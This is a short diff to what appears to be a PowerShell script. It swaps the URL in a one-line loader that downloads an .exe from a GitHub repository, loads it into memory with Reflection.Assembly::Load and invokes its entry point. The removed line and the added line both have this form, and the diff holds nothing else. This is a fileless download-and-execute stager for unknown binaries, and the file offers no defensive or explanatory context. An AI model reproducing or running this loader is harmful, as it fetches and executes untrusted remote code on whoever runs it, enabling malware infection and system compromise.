@@ -1,4 +1,5 @@
-[System.Reflection.Assembly]::Load((Invoke-WebRequest "https://github.com/mathsencud-creator/rs/raw/main/b.exe").Content).EntryPoint.Invoke($null, $null)
+[System.Reflection.Assembly]::Load((Invoke-WebRequest "https://raw.githubusercontent.com/raro88/teszt/refs/heads/main/aaaaa.exe").Content).EntryPoint.Invoke($null, $null)
+
 
 
 
